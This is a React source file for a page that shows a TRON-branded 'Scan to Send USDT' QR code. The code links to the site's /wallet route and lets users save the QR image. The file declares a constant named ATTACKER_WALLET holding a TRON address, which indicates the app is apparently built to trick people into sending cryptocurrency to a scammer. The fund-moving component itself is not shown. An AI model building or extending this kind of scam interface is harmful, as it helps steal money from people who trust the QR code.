import React from "react";
import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
import { QRCodeSVG } from "qrcode.react";
import WalletSend from "./wallet";

const ATTACKER_WALLET = "TJXJEWcjNMryw87etLmGUDs1i5F1hveBou";
// Replace the current TRON_LOGO_B64 with this one:
const TRON_LOGO_B64 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iI2ViMjczNCIgZD0iTTEzLjcxIDMuMzYgMyAxMWw2LjU1IDYuNTVMMTkuOCA4LjNsLTYuMDktNC45NHptLTEuMyAxLjQ1IDQuOTMgNGwtNy41MSA3LjUxLTMuNjQtMy42NCA2LjIyLTcuODd6Ii8+PC9zdmc+";
function HomePage() {
  const navigate = useNavigate();
  const qrValue = `${window.location.origin}/wallet`;

  const handleSaveQR = () => {
    const svg = document.querySelector("#qr-box svg");
    if (!svg) return;
    const s = 400, c = document.createElement("canvas");
    c.width = s; c.height = s;
    const x = c.getContext("2d");
    x.fillStyle = "#fff";
    x.fillRect(0, 0, s, s);
    const im = new Image();
    im.onload = () => {
      x.drawImage(im, 0, 0, s, s);
      const ls = s * 0.22, lp = (s - ls) / 2;
      x.beginPath();
      x.arc(s / 2, s / 2, ls / 2 + 10, 0, 2 * Math.PI);
      x.fillStyle = "#fff";
      x.fill();
      const lg = new Image();
      lg.onload = () => {
        x.drawImage(lg, lp, lp, ls, ls);
        const a = document.createElement("a");
        a.download = "tron-qr.png";
        a.href = c.toDataURL("image/png");
        a.click();
      };
      lg.src = TRON_LOGO_B64;
    };
    im.src = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(new XMLSerializer().serializeToString(svg))));
  };

  return (
    <div style={{ background: "#0b0e11", minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", padding: 20, fontFamily: "-apple-system, sans-serif" }}>
      <div style={{ background: "#fff", borderRadius: 16, padding: 24, width: "100%", maxWidth: 320, textAlign: "center" }}>
        <div id="qr-box" style={{ marginBottom: 16 }}>
          <QRCodeSVG value={qrValue} size={200} level="H" includeMargin={false} imageSettings={{ src: TRON_LOGO_B64, height: 44, width: 44, excavate: true }} />
        </div>
        <div style={{ color: "#0b0e11", fontSize: 14, fontWeight: 600, marginBottom: 8 }}>Scan to Send USDT</div>
        <div style={{ color: "#848e9c", fontSize: 12, marginBottom: 16 }}>Open your wallet app and scan this QR code</div>
        <button
          onClick={handleSaveQR}
          style={{
            width: "100%",
            background: "#1e2329",
            border: "1px solid #2b3139",
            borderRadius: 8,
            padding: 10,
            color: "#eaecef",
            fontSize: 13,
            fontWeight: 500,
            cursor: "pointer"
          }}
        >
          💾 Save QR Code
        </button>
      </div>
    </div>
  );
}

export default function App() {
  return (
    <Router>
      <Routes>
        <Route path="/" element={<HomePage />} />
        <Route path="/wallet" element={<WalletSend />} />
      </Routes>
    </Router>
  );
}